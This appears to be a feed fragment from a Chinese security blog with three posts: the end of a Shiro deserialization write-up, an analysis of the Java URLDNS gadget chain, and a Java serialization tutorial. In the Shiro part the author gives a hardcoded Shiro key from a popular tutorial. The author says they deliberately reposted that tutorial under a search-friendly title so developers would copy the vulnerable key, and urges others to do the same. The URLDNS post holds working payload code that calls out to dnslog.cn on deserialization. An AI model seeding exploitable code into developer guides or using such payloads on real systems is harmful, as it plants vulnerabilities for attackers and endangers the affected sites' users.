</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1.8.3</td>
<td style="text-align:center">3.2.1</td>
</tr>
<tr>
<td style="text-align:center">1.9.3</td>
<td style="text-align:center">3.2.2</td>
</tr>
<tr>
<td style="text-align:center">1.9.4</td>
<td style="text-align:center">3.2.2</td>
</tr>
</tbody>
</table>
<p>所以最终shiro使用漏洞版本1.2.4或其他高版本shiro但开发自己在shiro的配置文件中固定key导致存在漏洞，几率较高存在的gadget大概就是这样，在往下细节划分及gatget的原理还需要继续有时间再学习了</p>
<h3 id="0x06-增加shiro高版本存在漏洞几率-及-增加普通shiro漏洞几率">0x06 增加shiro高版本存在漏洞几率 及 增加普通shiro漏洞几率</h3>
<p>无意间查了一下shiro的一些教学，发现了一个排名靠前的&quot;靠谱教程&quot;，虽然他帖子写的是shiro的1.5.3版本，但是发现后面的自定义代码中固定了key:2AvVhdsgUs0FSA3SDFAdag== ，虽然没按照这个部署过，漏洞能不能成功易利用，但是还是要得多顶顶这个帖子</p>
<figure data-type="image" tabindex="20"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/20210112110540.png" alt="image-20210112110540381" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/20210112110550.png" alt="image-20210112110550114" loading="lazy"></figure>
<figure data-type="image" tabindex="22"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/20210112110558.png" alt="image-20210112110558579" loading="lazy"></figure>
<p>这个帖子越看越好，写的很详细，一定能帮助青涩开发解决使用shiro的难题，然后想了一下&quot;顺便&quot;复制了一下这个帖子，我又发在了简书里<a href="https://www.jianshu.com/p/3a5a56316523">Shiro整合前后端分离项目(在Web项目中使用shiro)</a> (还改了标题，增加关键词搜索几率)</p>
<p>同时在其中美中不足的地方进行了修改，使整个帖子对开发更加的友好，简单的改了改图片，加了几句话，有条件的师傅也可以再去博客园，CSDN发几篇，让安全从业者多多帮助懵懂的开发使用shiro组件做权限管理制作出更好的java网站，毕竟安全&amp;开发是一家人的呢    （逃</p>
<figure data-type="image" tabindex="23"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/20210112110605.png" alt="image-20210112110605649" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java反序列化的URLDNS链分析学习]]></title>
        <id>https://www.svenbeast.com/post/java-fan-xu-lie-hua-de-urldns-lian-fen-xi-xue-xi/</id>
        <link href="https://www.svenbeast.com/post/java-fan-xu-lie-hua-de-urldns-lian-fen-xi-xue-xi/">
        </link>
        <updated>2020-12-28T07:04:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x01-科普时间">0x01 科普时间</h2>
<h3 id="1-产生java反序列化的必备条件">1. 产生java反序列化的必备条件</h3>
<p>当Java应用对用户输入，也就是不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的<code>对象</code>，在产生非预期对象的过程中就有可能造成任意代码执行。</p>
<ul>
<li>
<p>为什么Java反序列化的出现率这么高？</p>
<pre><code class="language-java">因为Java会给用户提供一些公用库，例如commons-collections,commons-beanutils这些库中实现的一些类可以被反序列化用来实现任意代码执行。
WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些应用的反序列化漏洞能够得以利用，就是依靠了commons-collections
</code></pre>
</li>
</ul>
<p>也就是说，<strong>可控的序列化数据 + 公用的java依赖库</strong>是导致Java反序列化的根本条件</p>
<h3 id="2-一些不是基本数据类型的传参">2. 一些不是基本数据类型的传参</h3>
<p>方法中传入的参数类型为<strong>参数类型</strong>，不是int,String这些基本数据类型是啥意思</p>
<p>意思就是设置了一个该类的对象~ 可以直接调用的啦，不需要在实例化了</p>
<pre><code class="language-java">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
</code></pre>
<h3 id="3-java的映射map是什么">3. java的映射(Map)是什么</h3>
<p>Map是java提供的一个官方接口，使用的话就是 import java.util.Map;</p>
<p>作用: 给定一个键和一个值，你可以将该值存储在一个 Map 对象。之后，你可以通过键来访问对应的值。</p>
<p>HashMap类是实现Map接口的一个类，实现上行说的那个功能的具体代码</p>
<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1609139452211.png" alt="" loading="lazy"></figure>
<h3 id="4-如何实现类在被反序列化时触发类里的某个方法">4. 如何实现类在被反序列化时触发类里的某个方法</h3>
<p>在序列化和反序列化过程中需要特殊处理的类必须实现具有以下确切签名的特殊方法：</p>
<pre><code class="language-java">private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;
</code></pre>
<h3 id="5-java反射是什么及个人理解">5. java反射是什么及个人理解。</h3>
<p>反射之中包含了一个「反」字，所以想要解释反射就必须先从「正」开始解释。</p>
<p>一般情况下，我们使用某个类时必定知道它是什么类，是用来做什么的。于是我们直接对这个类进行实例化，之后使用这个类对象进行操作。</p>
<pre><code>Apple apple = new Apple(); //直接初始化，「正射」
apple.setPrice(8999);
</code></pre>
<p>上面这样子进行类对象的初始化，我们可以理解为「正射」。</p>
<p>而反射则是一开始并不知道我要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。</p>
<blockquote>
<p>敲黑板了</p>
<p>[推荐阅读顺序一]https://blog.csdn.net/qq_36226453/article/details/82790375<br>
[推荐阅读顺序二]https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html</p>
</blockquote>
<p><strong>个人理解：</strong></p>
<p><strong>1.就是java把所有的.class文件当做一个class类，想要用先告诉java你要用哪个class类，然后提供一部分方法实现或者说是细化这个功能</strong></p>
<p><strong>2.就是java把class类里所有的方法当做class类一个子类，想要用就用上步创建的你的目标class对象来调用，提供一部分方法实现或者说是细化这个功能</strong></p>
<p><strong>3.就是java把class类里所有的属性(变量)当做一个class类一个子类，想要用就用上上步创建的你的目标class对象来调用，提供一部分方法实现或者说是细化这个功能</strong></p>
<p><strong>4.想要执行目标类的方法要使用Object object = clazz.newInstance(); 先获得一个对象，就是上上上步获得的目标class对象的newInstance()方法获得一个目标class对象的字节码对象，还得用invoke调用，然后有时候还等同于new一个对象，比如序列化时传入writeObject()的也是这个对象(这步纯个人理解，有点迷糊，好吧我是垃圾)</strong></p>
<pre><code class="language-java">我写的学习代码
package com.company;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class ReflexDemo {

    String name = &quot;张三&quot;;
    int age = 18;

    public String ReflexDemo() {
        String result = &quot;name:&quot; + name + &quot; age:&quot; + age;
        return result;
    }

    public String getName(String nameDemo) {
        this.name = nameDemo;
        return name;

    }

    public int getAge(int ageDemo) {
        this.age = ageDemo;
        return age;
    }

    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {
        /*
            通过反射执行目标类的方法
        */

        //获取Class对象，我理解为java在运行的时候将运行的所有xxxx.class文件当做一个class类，然后用这个方法在这个大个的class类中获得需要使用的类的对象
        Class clazz = Class.forName(&quot;com.company.ReflexDemo&quot;);

        //在上步获得的Class对象里获得里面的getName方法作为目标方法的对象,传入的就是方法名及需要的参数数据类型 (已知想使用的目标方法名)
        Method method = clazz.getMethod(&quot;getAge&quot;, int.class);

        //在上上步获得Class对象获得XXX，就当获得class对象的执行代码的字节码？不知道这步叫啥，我就当成是固定格式了，有的人还会先用getConstructor()方法在用newInstance()，查的时候也说newInstance是获得构造方法的，但是不是构造方法也能用啊，不清楚
        Object object = clazz.newInstance();

        //用获得目标方法的对象method使用invoke()方法执行此方法，传入的是目标方法的对象和需要的参数
        System.out.println(method.invoke(object,15));


        /*
            通过反射修改目标类的变量
        */

        Method methodTwo = clazz.getMethod(&quot;ReflexDemo&quot;);
        System.out.println(&quot;未修改前:&quot; + methodTwo.invoke(object));

        Field field = clazz.getDeclaredField(&quot;age&quot;); //获得想要修改的变量名对象
        field.setAccessible(true); //设置为允许访问
        field.set(object,8); //修改age变量的值为8

        System.out.println(&quot;已修改后:&quot; + methodTwo.invoke(object));

    }
}
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1609139725146.png" alt="" loading="lazy"></figure>
<ul>
<li>本文用到java反射相关的方法</li>
</ul>
<p><code>getDeclaredFields()</code> :  使用 Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性</p>
<p><code>forName()</code> : 获取Class对象，我理解为java在运行的时候将运行的所有xxxx.class文件当做一个class类，然后用这个方法在这个大个的class类中获得需要使用的类的Class对象</p>
<p><code>setAccessible()</code> : 将目标类里的变量设置为允许修改状态</p>
<p><code>set()</code> : 对想要修改的变量值进行赋值</p>
<h2 id="0x02-了解前置知识后的urldns利用链构造">0x02 了解前置知识后的URLDNS利用链构造</h2>
<pre><code class="language-java">package com.company;

import java.util.HashMap;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;

public class  UrldnsDemo {

    public static void main(String[] args) throws Exception {
        HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();
        URL url = new URL(&quot;http://y4dehg.dnslog.cn&quot;);
        url.hashCode();

    }
}
</code></pre>
<p>首先是要知道的是java.net.URL这个类，在创建对象后调用hashCode()方法是会调用getHostAddress()方法的，所以会请求一次域名，跟进的话ctrl/command+鼠标左键点击hashCode()然后在点击hashCode()就能看到getHostAddress了</p>
<figure data-type="image" tabindex="3"><img src="https://www.svenbeast.com/post-images/1609139798898.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://www.svenbeast.com/post-images/1609139837231.png" alt="" loading="lazy"></figure>
<p>而java.util.HashMap这个类重写了readObject方法(跟进头部代码import java.util.HashMap的HashMap即可获得源代码)，且设置为此readObject()方法在被反序列化时执行，最终在此方法的代码最下面执行了hash方法传入的参数是从反序列化字节码中得到的key</p>
<figure data-type="image" tabindex="5"><img src="https://www.svenbeast.com/post-images/1609139845213.png" alt="" loading="lazy"></figure>
<p><img src="https://www.svenbeast.com/post-images/1609139850530.png" alt="" loading="lazy"><br>
<img src="https://www.svenbeast.com/post-images/1610029748541.png" alt="" loading="lazy"></p>
<p>所以尝试写一下payload，看看能否反序列化时发出dns请求</p>
<pre><code class="language-java">Map hashMap = new HashMap();  //实例化hashMap类，利用的就是此类他重写的readObject方法，被反序列化时自动调用
URL url = new URL(&quot;http://dskg3c.dnslog.cn&quot;);  //实例化URL类，传入准备请求的域名，此对象用来当做key传入hashMap的
hashMap.put(url,&quot;test&quot;);  //写入到hashMap中，url为key，test为value，hashMap就是用来存储键值对的一个数据类型

ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
oos.writeObject(hashMap);

ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
ois.readObject();
</code></pre>
<p>发现在反序列化时无法发出dns请求，后续在HashMap.java的1413行就是hash方法那里打断点跟进后面的代码才知道，就是因为下图显示，满足hashCode!=-1条件，没有执行902行真正的hashCode()方法</p>
<figure data-type="image" tabindex="6"><img src="https://www.svenbeast.com/post-images/1609140053169.png" alt="" loading="lazy"></figure>
<p>所以要更改hashCode变量的值就用到了java的反射，代码修改为</p>
<pre><code class="language-java">package com.company;

import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.util.HashMap;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Map;

public class  UrldnsDemo {

    public static void main(String[] args) throws Exception {

        Map hashMap = new HashMap();  //实例化hashMap类，利用的就是此类他重写的readObject方法，被反序列化时自动调用
        URL url = new URL(&quot;http://bqorej.dnslog.cn&quot;);  //实例化URL类，传入准备请求的域名，此对象用来当做key传入hashMap的

        Class clazz = Class.forName(&quot;java.net.URL&quot;); //获取想要反射的目标类的Class对象
        Field f = clazz.getDeclaredField(&quot;hashCode&quot;); //在存储的想要反射的目标类的clazz对象中的所有变量中获得hashCode变量存入f对象
        f.setAccessible(true); //设置hashCode变量为允许访问

        f.set(url,1); //锦上添花，加上这句就可以在下面这句put的时候让本地不发出dns请求，就跟文章前面的代码没有成功发出dns请求的原理一样，为了让hashCode!=-1 ,就随便赋个值
        hashMap.put(url,&quot;test&quot;);  //写入到hashMap中，url为key，test为value，hashMap就是用来存储键值对的一个数据类型
        f.set(url,-1); //修改的是URL类里的变量，所以传入url对象和要修改的值

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
        oos.writeObject(hashMap);

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
        ois.readObject();


//        Map m1 = new HashMap();
//        m1.put(&quot;Zara&quot;, &quot;8&quot;);
//        m1.put(&quot;Mahnaz&quot;, &quot;31&quot;);
//        m1.put(&quot;Ayan&quot;, &quot;12&quot;);
//        m1.put(&quot;Daisy&quot;, &quot;14&quot;);
//        System.out.println();
//        System.out.println(&quot; Map Elements&quot;);
//        System.out.print(&quot;\t&quot; + m1);

    }
}
</code></pre>
<p>这样就可以实现java在反序列化的时候发出了dns请求</p>
<figure data-type="image" tabindex="7"><img src="https://www.svenbeast.com/post-images/1609140072400.png" alt="" loading="lazy"></figure>
<p>PS：可能说的比较啰嗦，因为我是在理解URLDNS利用链前还得先去了解一些java的知识，一些也写到文章里了，其实就是硬啃o(╥﹏╥)o，后来理解了后觉得URLDNS这个链确实很简单，大部分时间还是在学习前置知识，也方便后续的其他链的学习啦</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java序列化和反序列化]]></title>
        <id>https://www.svenbeast.com/post/java-xu-lie-hua-he-fan-xu-lie-hua/</id>
        <link href="https://www.svenbeast.com/post/java-xu-lie-hua-he-fan-xu-lie-hua/">
        </link>
        <updated>2020-12-16T15:33:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="科普时间">科普时间</h2>
<p><strong>对象</strong>：java实例化一个类的时候，可以称为一个对象，或者一个实例，比如下方的myPuppy （其他方法忽略）</p>
<pre><code class="language-java">Puppy myPuppy = new Puppy(&quot;tommy&quot;);
</code></pre>
<p><strong>抽象类</strong>：父类是将子类所共同拥有的属性和方法进行抽取，这些属性和方法中，有的是已经明确实现了的，有的还无法确定，那么我们就可以将其定义成抽象，在以后的子类中进行重用，进行具体化(就是继承父类的方法名，重新定义方法内容)</p>
<p><code>用abstract关键字来修饰抽象方法，用abstract来修饰抽象类</code></p>
<p><strong>抽象方法</strong>：在抽象类中的用abstract修饰的方法，只定义个方法名字，没有内容，方便子类继承这个类的时候具体将此方法内容定义出来</p>
<pre><code class="language-java">package javastudy;

public class AbstractDemo1 {

    public static void main(String[] args) {
        // TODO Auto-generated method stub

    }
}

// 这就是一个抽象类
abstract class Animal {
    String name;
    int age;

    // 动物会叫   这就是一个抽象方法
    public abstract void cry(); // 不确定动物怎么叫的。定义成抽象方法，来解决父类方法的不确定性。抽象方法在父类中不能实现，所以没有函数体。但在后续在继承时，要具体实现此方法。
}

// 抽象类可以被继承
// 当继承的父类是抽象类时，需要将抽象类中的所有抽象方法全部实现。
class cat extends Animal {
    // 实现父类的cry抽象方法
    public void cry() {
        System.out.println(&quot;猫叫:&quot;);

    }
}
</code></pre>
<p><strong>接口</strong>：是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p>
<pre><code class="language-java">//一个简单的接口
interface in1 {
	// 默认为 Public Static Final 
	final int a =10;
	
	// 默认为抽象方法 public and abstract
	void display();

}
</code></pre>
<p>继承接口的方式是使用implements去实现接口，当你为了实现接口写的类中实现了接口所有的方法，才算这个类实现接口成功：</p>
<pre><code class="language-java">class testClass implements in1 {
	// 实现接口中的方法
	public void display() {
		System.out.println(&quot;Study&quot;);
	}
}
</code></pre>
<p>写一个测试类，用来测试一下刚才实现的这个接口，因为testclass类的对象t实现了接口规定的display方法，那么自然而然就可以调用display()方法咯。</p>
<pre><code class="language-java">class testClass implements in1 {
	// 实现接口中的方法
	public void display() {
		System.out.println(&quot;Study&quot;);
	}
	
	public static void main (String[] args) {
		testClass t = new testClass();
		t.display();
		System.out.println(a);
	}
}
</code></pre>
<h2 id="概念">概念</h2>
<ul>
<li>
<p>序列化：把对象转换为字节序列的过程称为对象的序列化。</p>
</li>
<li>
<p>反序列化：把字节序列恢复为对象的过程称为对象的反序列化。</p>
</li>
</ul>
<p>在Java中，我们可以通过多种方式来创建对象，并且只要对象没有被回收我们都可以复用此对象。但是，我们创建出来的这些对象都存在于JVM中的堆（heap）内存中，只有JVM处于运行状态的时候，这些对象才可能存在。一旦JVM停止，这些对象也就随之消失，但是在真实的应用场景中，我们需要将这些对象持久化下来，并且在需要的时候将对象重新读取出来，Java的序列化和反序列化可以帮助我们实现该功能。</p>
<p>主要两种用途：</p>
<p>1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；</p>
<p>2） 在网络上传送对象的字节序列。</p>
<p>最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些session先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。</p>
<h2 id="相关接口及类">相关接口及类</h2>
<p>Java为了方便开发人员将java对象序列化及反序列化提供了一套方便的API来支持，其中包括以下接口和类</p>
<pre><code class="language-java">java.io.Serializable   //接口1

java.io.Externalizable  //接口2

ObjectOutput

ObjectInput

ObjectOutputStream

ObjectInputStream
</code></pre>
<h2 id="demo">Demo</h2>
<ul>
<li>
<p>使用Java.io.Serializable对类的序列化和反序列化</p>
<pre><code class="language-java">package com.company;

import java.io.*;

public class SerializableDemo1 {

    //建立User类实现java提供的Serializable接口
    public static class User implements Serializable {
        private String userName;


        public void setName(String userName) {
            this.userName = userName;
        }

        public String getName() {
            return userName;
        }


    }
    //序列化demo
    public static void main(String[] args) throws Exception, IOException {

        //初始化对象
        User resOld = new User();    //要序列化的对象
        resOld.setName(&quot;awsl&quot;);
        System.out.println(&quot;序列化前:&quot; + resOld.getName());   //首尾呼应~

        //序列化对象到文件中
        FileOutputStream  creatFile = new FileOutputStream(&quot;ser&quot;);   //创建ser文件
        ObjectOutputStream serResult = new ObjectOutputStream(creatFile);
        serResult.writeObject(resOld);  //将序列化后的字节写入文件
        serResult.close();

        //反序列化
        FileInputStream readFile = new FileInputStream(&quot;ser&quot;);  //读取ser文件
        ObjectInputStream unserFile = new ObjectInputStream(readFile);  //读取序列化后的字节
        User resNew = (User) unserFile.readObject();    //反序列化还原对象
        unserFile.close();

        System.out.println(&quot;序列化后:&quot; + resNew.getName());  //首尾呼应~
    }

}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1608132960801.png" alt="" loading="lazy"></figure>
</li>
<li>
<p>使用java.io.Externalizable对类的序列化和反序列化</p>
<pre><code class="language-java">package com.company;

import java.io.*;

public class SerializableDemo2 {

    //建立Study类实现java提供的Externalizable接口
    public static class Study implements Externalizable {
        private String  myName;

        public void setName(String argsName){
            this.myName = argsName;
        }

        public String getName() {
            return this.myName;
        }

        @Override  //使用Externalizable接口会强制生成此类
        public void writeExternal(ObjectOutput out) throws IOException {
            out.writeObject(myName);   //不这样会导致序列化后，变量的值被清空
        }

        @Override  //使用Externalizable接口会强制生成此类
        public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
            myName = (String)in.readObject(); //不这样会导致序列化后，变量的值被清空
        }
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        //初始化参数
        Study resOld = new Study();
        resOld.setName(&quot;xmsl&quot;);
        System.out.println(&quot;序列化前:&quot; + resOld.getName());  //首尾呼应

        //创建用来存储序列化字节码的文件
        FileOutputStream creatFile = new FileOutputStream(&quot;ser2&quot;);

        //序列化
        ObjectOutputStream serResult = new ObjectOutputStream(creatFile);
        serResult.writeObject(resOld);
        serResult.close();
        //读取刚才用来存储序列化字节码的文件
        FileInputStream readFile = new FileInputStream(&quot;ser2&quot;);

        //反序列化
        ObjectInputStream unserResult = new ObjectInputStream(readFile);
        Study resNew = (Study) unserResult.readObject();
        unserResult.close();
        System.out.println(&quot;序列化后:&quot; + resNew.getName());  //首尾呼应
    }
  
}

</code></pre>
<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1608133052564.png" alt="" loading="lazy"></figure>
</li>
</ul>
<h3 id="其他">其他</h3>
<ul>
<li>
<p>序列化保存的是对象的状态</p>
</li>
<li>
<p>静态变量属于类的状态，因此 序列化并不保存静态变量</p>
</li>
<li>
<p>使用<strong>transient</strong>修饰不想被序列化的变量，在变量声明前加上该关键字，可以阻止该变量被序列化到文件中，在被反序列化后，transient 变量的值被设为初始值，如 int 型的是 0，对象型的是 null。</p>
<pre><code class="language-java">public transient int youAge;
</code></pre>
</li>
</ul>
]]></content>
    </entry>
</feed>